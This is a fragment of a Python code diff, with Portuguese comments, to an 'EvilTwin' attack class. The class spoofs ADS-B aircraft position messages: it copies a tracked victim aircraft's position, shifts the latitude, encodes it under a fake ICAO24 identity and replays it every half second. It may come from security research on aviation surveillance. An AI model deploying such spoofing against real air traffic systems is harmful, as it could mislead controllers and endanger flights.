@@ -70,6 +70,9 @@ class EvilTwin(AbstractAttack):
         # timeout de espera de mensagens ADS-B da vítima selecionada em segundos
         self.__time_out = 20
 
+        #
+        self.__s_last_position_msg = "ODD"
+
         # tempo para iniciar o ataque
         M_LOG.info("<< EvilTwin.__init__")
 
@@ -86,15 +89,23 @@ class EvilTwin(AbstractAttack):
 
             if (ldefs.LATITUDE and ldefs.LONGITUDE and ldefs.LAST_TYPE and ldefs.ALTITUDE) in self.__dct_aircraft:
                 li_sv = 0
+
                 lf_latitude = self.__dct_aircraft[ldefs.LATITUDE]
+                lf_latitude += 0.05
                 lf_longitude = self.__dct_aircraft[ldefs.LONGITUDE]
                 lf_altitude = self.__dct_aircraft[ldefs.ALTITUDE]
-                ls_last_position_msg = self.__dct_aircraft[ldefs.LAST_TYPE]
+                #ls_last_position_msg = self.__dct_aircraft[ldefs.LAST_TYPE]
 
                 # Hex
-                ls_msg = self.encode_airborne_position(self.__s_fake_icao24, li_sv, lf_latitude,
-                                                       lf_longitude, lf_altitude, ls_last_position_msg)
-                self.replay(ls_msg)
+                #ls_msg = self.encode_airborne_position(self.__s_fake_icao24, li_sv, lf_latitude,
+                #                                       lf_longitude, lf_altitude, ls_last_position_msg)
+                M_LOG.debug("!! self.__s_last_postion_msg [%s]" % self.__s_last_position_msg)
+                ls_msg, ls_last_msg = self.encode_airborne_position(self.__s_fake_icao24, li_sv, lf_latitude,
+                                                       lf_longitude, lf_altitude, self.__s_last_position_msg)
+                if ls_msg is not None:
+                    self.__s_last_position_msg = ls_last_msg
+                    M_LOG.debug("!! self.__s_last_position_msg [%s]" % self.__s_last_position_msg)
+                    self.replay(ls_msg)
 
                 # mensagens de meio em meio segundo.
                 time.sleep(0.5)
@@ -186,8 +197,6 @@ class EvilTwin(AbstractAttack):
                     # waiting for new attack
                     self.restart()
 
-            if ldefs.LATITUDE in self.__dct_aircraft:
-                self.__dct_aircraft[ldefs.LATITUDE] += 0.05;
 
         M_LOG.info("<< EvilTwin.spy")
         return
